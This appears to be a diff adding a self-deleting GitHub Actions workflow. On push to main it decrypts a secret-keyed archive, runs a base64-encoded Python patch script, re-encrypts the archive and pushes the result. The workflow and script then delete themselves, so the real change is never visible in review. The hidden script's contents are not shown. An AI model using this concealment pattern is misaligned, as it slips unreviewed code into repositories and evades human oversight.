@@ -1,0 +1,49 @@
+name: Add lightweight Render keepalive endpoint
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  apply:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    environment: runtime
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          persist-credentials: true
+
+      - name: Repack lightweight keepalive endpoint
+        shell: bash
+        env:
+          ARCHIVE_KEY: ${{ secrets.ARCHIVE_KEY }}
+        run: |
+          set -Eeuo pipefail
+          umask 077
+          test -n "$ARCHIVE_KEY"
+          work="$RUNNER_TEMP/render-keepalive-endpoint"
+          mkdir -p "$work/payload"
+          printf '%s' "$ARCHIVE_KEY" | gpg --quiet --batch --yes --pinentry-mode loopback --passphrase-fd 0 --decrypt --output "$work/payload.tgz" .assets/node.dat
+          tar -xzf "$work/payload.tgz" -C "$work/payload"
+          base64 -d .assets/add_keepalive_endpoint.b64 > "$work/patch.py"
+          PAYLOAD_DIR="$work/payload" python "$work/patch.py"
+          cd "$work/payload"
+          python -m py_compile webhook.py
+          tar -czf "$work/updated.tgz" .
+          printf '%s' "$ARCHIVE_KEY" | gpg --quiet --batch --yes --pinentry-mode loopback --passphrase-fd 0 --symmetric --cipher-algo AES256 --digest-algo SHA512 --output "$GITHUB_WORKSPACE/.assets/node.dat" "$work/updated.tgz"
+          rm -rf "$work"
+
+      - name: Commit payload and remove transient files
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          git config user.name "nowminutes-release"
+          git config user.email "nowminutes-release@users.noreply.github.com"
+          rm .github/workflows/add-render-keepalive-endpoint.yml .assets/add_keepalive_endpoint.b64
+          git add -A
+          git commit -m "Add lightweight Render keepalive endpoint"
+          git push origin HEAD:main
